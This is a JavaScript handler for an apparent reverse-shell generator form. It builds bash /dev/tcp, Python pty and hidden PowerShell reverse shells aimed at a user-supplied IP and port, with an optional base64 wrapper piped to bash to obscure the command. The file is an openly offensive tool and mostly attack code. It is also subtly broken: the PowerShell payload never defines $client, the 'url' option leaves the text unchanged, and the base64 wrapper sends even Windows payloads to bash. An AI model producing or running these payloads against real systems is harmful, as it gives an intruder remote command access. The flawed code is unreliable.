document.getElementById("reverseShellForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const os = document.getElementById("os").value;
  const shell = document.getElementById("shellType").value;
  const ip = document.getElementById("ip").value;
  const port = document.getElementById("port").value;
  const encoding = document.getElementById("encoding").value;
  const preview = document.getElementById("preview");

  if (!ip || !port) {
    preview.innerHTML = "<span style='color:red'>IP and port required.</span>";
    return;
  }

  let rawPayload = "";
  if (os === "Linux") {
    if (shell === "bash") {
      rawPayload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
    } else if (shell === "Python") {
      rawPayload = `python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("${ip}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn("/bin/bash")'`;
    }
  } else if (os === "Windows") {
    if (shell === "PowerShell") {
      rawPayload = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"`;
    }
  }

  if (!rawPayload) {
    preview.innerHTML = "<span style='color:red'>Invalid option combination.</span>";
    return;
  }

  let output = "";
  if (encoding === "base64") {
    const encoded = btoa(rawPayload);
    output = `echo ${encoded} | base64 -d | bash`;
  } else if (encoding === "url") {
    output = decodeURIComponent(encodeURIComponent(rawPayload)); // to cleanly display
  } else {
    output = rawPayload;
  }

  preview.innerHTML = `<pre>${output}</pre>`;
});
